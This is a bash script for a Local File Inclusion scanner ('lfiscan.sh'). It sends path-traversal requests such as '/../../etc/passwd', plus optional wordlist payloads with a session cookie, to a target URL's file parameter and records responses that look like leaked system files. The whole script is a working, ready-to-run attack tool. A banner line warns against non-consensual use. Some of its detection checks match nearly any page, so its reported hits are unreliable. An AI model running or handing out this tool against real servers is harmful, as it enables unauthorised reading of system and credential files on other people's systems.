#!/bin/bash

tput reset
reset=`tput sgr0`
red=`tput setaf 1`
green=`tput setaf 2`
yellow=`tput setaf 3`
blue=`tput setaf 4`
magenta=`tput setaf 5`
cyan=`tput setaf 6`
white=`tput setaf 7`

temp="/tmp/lfiscan/"
mkdir "$temp" 2>/dev/null
#rm -r /tmp/lfiscan/* 2>/dev/null


systime=$(date +"%m-%d-%y")
output="${output}"

travels="${travels}"
path="/.."
sp='//--\\||'
payload="/etc/passwd"

return=0
args="$@"
url="${url}"
lines="${lines}"
target=${target}
cookie="${example}"
wordlist="${wordlist}"
sample="${sample}"

bar='###############################################################'

while getopts "u:c:w:t:h" option; do
	case $option in
		u)
         	url=$OPTARG
         	target=$(echo $url | sed -e 's|^[^/]*//||' -e 's|/.*$||')
         	output="$target"
			echo "" > "$temp$output""_payload"
         	;;
		c)
	        cookie=$OPTARG;;
		w)
	        wordlist=$OPTARG
	        lines=$(cat $wordlist | wc -l)
	        ;;
	    t)
			travels=$OPTARG;;
		h)
			sample=1
			;;
	    \?)
			clear
			sample=1
			;;
   esac
done

function confirm {
    QUESTION=$1
    DEFAULT=$2
    if [ "$DEFAULT" = true ]; then
        OPTIONS="[Y/n]"
        DEFAULT="y"
    else
        OPTIONS="[y/N]"
        DEFAULT="n"
    fi

    read -p "$QUESTION $OPTIONS " -n 1 -s -r INPUT
    INPUT=${INPUT:-${DEFAULT}}
    echo ${INPUT}
    echo ""

    if [[ "$INPUT" =~ ^[yY]$ ]]; then
        ANSWER=true
    else
        ANSWER=false
    fi
}


function banner(){
	echo -e "${blue}
███████ ██████   █████   ██████ ███████ ███████ ███████  ██████ 
██      ██   ██ ██   ██ ██      ██      ██      ██      ██      
███████ ██████  ███████ ██      █████   ███████ █████   ██      
     ██ ██      ██   ██ ██      ██           ██ ██      ██      
███████ ██      ██   ██  ██████ ███████ ███████ ███████  ██████"

	echo "${red}linktr.ee/hltakydn${reset}                            ${blue}coded by hLtAkydn"
	echo -e "                                                  ${green}Version: v0.6\n"
	for i in {1..100}; do
		if [[ $i > 0 ]]; then
			color=${red}
		fi
		if [[ $i > 15 ]]; then
			color=${red}
		fi
		if [[ $i > 30 ]]; then
			color=${yellow}
		fi
		if [[ $i > 50 ]]; then
			color=${green}
		fi
		if [[ $i > 75 ]]; then
			color=${green}
		fi
	    echo -ne "${color}${bar:0:$i}\r"
	    sleep .02
	done
	echo -ne "${green}# Attacking targets without mutual consent is illegal! ########${reset}\n"
	sleep 1
	echo -e "\n${red}===================${green}Local File Inclusion Scanner${red}=================\n${reset}"
	sleep 1
} 



function sample(){
	if [[ "$sample" = 1 ]]; then
		echo -e '\n'${red}'Example:  '${green}'./lfiscan.sh '${magenta}'-u '${yellow}'"http://example.com/index.php?page=" '${magenta}''
		echo -e '\n'${red}'Advanced: '${green}'./lfiscan.sh '${magenta}'-u '${yellow}'"http://example.com/index.php?page=" '${magenta}'-c '${yellow}'"PHPSESSID=;" '${magenta}'-w '${yellow}'wordlist.txt'${reset}''
		echo -e '\n'${red}'          '${green}'./lfiscan.sh '${magenta}'-u '${yellow}'"http://example.com/index.php?page=" '${magenta}'-c '${yellow}'"PHPSESSID=;" '${magenta}'-w '${yellow}'wordlist.txt '${magenta}'-t '${yellow}'5'${reset}''
		echo -e "\n${green}The scan results are saved in the ${cyan}$temp ${green}folder and the ${cyan}-t 3 ${green}parameter specifies travels ${red}/../../../ "
		exit
	fi
}

function domain() {
	if curl --output /dev/null --silent --head --fail "$target"; then
		echo -e "[${green}*${reset}] [HST] ${green}$target${reset} code: $(curl -sL -w "%{http_code}\\n" "$target" -o /dev/null)"
	  	echo -e "[${green}*${reset}] [RPT] Report Path: ${cyan}$temp$output${reset}\n"
	else
	  	echo -e "[${red}!${reset}] [URL] URL Does Not Exist: $target\n\n"
		echo -e "[${green}?${reset}]"' [EXP] '${green}'./lfiscan.sh '${magenta}'-h'${reset}''
		echo -e "[${green}?${reset}]"' [EXP] '${green}'./lfiscan.sh '${magenta}'-u '${yellow}'"http://example.com/index.php?page=" '${magenta}''
		exit
	fi
}

function stats(){
	tput cup 16 0 && tput ed
	echo -ne "[${green}${sp:i++%${#sp}:1}${reset}] [SCN] Scan in Progress ($k)\n"
}



function clean(){
	echo "."
	#tput cup 17 0 && tput ed
}

function checking(){
	if [[ $(grep 'bin' /tmp/lfiscan/$output"_tmp") == *":0:0:"* ]] || [[ $(grep 'HW type' /tmp/lfiscan/$output"_tmp") == *"HW type"* ]]; then
		clean
		echo -e "[${green}!${reset}] [LFI] ${green}$url$payload${reset}\n" 
		echo -e "$url$payload" >> "$temp$output""_payload"
		sleep 3 

		if [[ $return = 0 ]]; then
			confirm "[${green}?${reset}] ${red}Continue Scanning?${reset}" true
		    DOIT=$ANSWER
		    if [[ "$DOIT" = true ]]; then
		        return=1
		    else
		    	exit
		    fi
		fi
		clean

	fi

	if [[ $(grep 'This product contains software licensed under terms which require Microsoft to display the following' /tmp/lfiscan/$output"_tmp") == *"This product contains software licensed under terms which require Microsoft to display the following"* ]] || [[ $(grep '200' /tmp/lfiscan/$output"_tmp") == *"200"* ]] || [[ $(grep 'HTTP' /tmp/lfiscan/$output"_tmp") == *"HTTP"* ]] || [[ $(grep ':tid' /tmp/lfiscan/$output"_tmp") == *":tid"* ]] || [[ $(grep 'pid' /tmp/lfiscan/$output"_tmp") == *"pid"* ]] || [[ $(grep 'PHP Warning:' /tmp/lfiscan/$output"_tmp") == *"PHP Warning:"* ]] || [[ $(grep 'ssl:warn' /tmp/lfiscan/$output"_tmp") == *"ssl:warn"* ]] || [[ $(grep 'core:notice' /tmp/lfiscan/$output"_tmp") == *"core:notice"* ]] || [[ $(grep 'child process' /tmp/lfiscan/$output"_tmp") == *"child process"* ]] || [[ $(grep 'worker threads' /tmp/lfiscan/$output"_tmp") == *"worker threads"* ]]; then
		clean
		echo -e "[${green}!${reset}] [LFI] ${green}$url$payload${reset}\n" 
		echo -e "$url$payload" >> "$temp$output""_payload"
		sleep 3 

		if [[ $return = 0 ]]; then
			confirm "[${green}?${reset}] ${red}Continue Scanning?${reset}" true
		    DOIT=$ANSWER
		    if [[ "$DOIT" = true ]]; then
		        return=1
		    else
		    	exit
		    fi
		fi
		clean
	fi
}


function scanner(){

	if [[ -z "$url" ]]; then
		sample
		exit
	fi

	if [[ -z "$travels" ]]; then
		travels=5
	fi


	if [[ -z "$wordlist" ]]; then
		echo -e "[*] [URL] [ $url$payload ]" >> "$temp$output"
		curl -s --cookie "$cookie" "$url$payload" >> "$temp$output"
		curl -s --cookie "$cookie" "$url$payload" > "$temp$output""_tmp"

		for ((h = 0; h < travels; h++)); do
			payload="$path$payload"
    		echo -e "[*] [URL] [ $url$payload ]" >> "$temp$output"
    		curl -s --cookie "$cookie" "$url$payload" >> "$temp$output"
    		curl -s --cookie "$cookie" "$url$payload" > "$temp$output""_tmp"

			echo -ne "[${red}?${reset}] [URL] ${red}$url$payload${reset}\r"
			((j++)); k="$(($j))/$(($travels))"
			checking "$url"
			sleep .2
			stats
		done
	else
		proces=$(cat "$wordlist")

		for payload in $proces; do
			echo -e "[*] [URL] [ $url$payload ]" >> "$temp$output"
			curl -s --cookie "$cookie" "$url$payload" >> "$temp$output"
			curl -s --cookie "$cookie" "$url$payload" > "$temp$output""_tmp"

			for ((h = 0; h < travels; h++)); do
				payload="$path$payload"
				echo -e "[*] [URL] [ $url$payload ]" >> "$temp$output"
				curl -s --cookie "$cookie" "$url$payload" >> "$temp$output"
				curl -s --cookie "$cookie" "$url$payload" > "$temp$output""_tmp"

				echo -ne "[${red}?${reset}] [URL] ${red}$url$payload${reset}\r"
				((j++)); k="$(($j))/$(($travels * $lines))"
				checking "$url"
				sleep .2
				stats		
			done
		done
	fi

	clean

	confirm "[${green}?${reset}] [FNS] ${red}scan completed, open payload list?${reset}" true
	DOIT=$ANSWER
    if [[ "$DOIT" = true ]]; then
       	nano "$temp$output""_payload"
       	exit
    else
    	exit
    fi

}

banner
domain
scanner